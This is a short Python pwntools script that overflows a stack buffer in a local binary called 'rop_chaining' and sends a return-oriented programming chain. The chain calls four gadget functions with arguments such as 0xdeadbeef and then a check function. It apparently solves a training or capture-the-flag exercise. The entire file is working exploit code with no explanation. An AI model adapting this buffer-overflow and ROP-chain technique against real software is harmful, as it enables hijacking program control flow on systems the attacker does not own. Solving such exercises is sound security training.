#!/usr/bin/env python2

import sys
from pwn import *

rop_1 = 0x080484b6
rop_2 = 0x080484d8
rop_3 = 0x080484fa
rop_4 = 0x0804851c
check = 0x0804853e
pop_ebx = 0x0804834d

rop_1_arg = 0xdeadbeef
rop_2_arg = 0xcafebabe
rop_3_arg = 0xbaddad
rop_4_arg = 0x0ddba11

payload  = 'a'*92
payload += p32(rop_1) + p32(pop_ebx) + p32(rop_1_arg)
payload += p32(rop_2) + p32(pop_ebx) + p32(rop_2_arg)
payload += p32(rop_3) + p32(pop_ebx) + p32(rop_3_arg)
payload += p32(rop_4) + p32(pop_ebx) + p32(rop_4_arg)
payload += p32(check)

p = process('./rop_chaining')
p.send(payload)
p.shutdown('out')
p.stream()
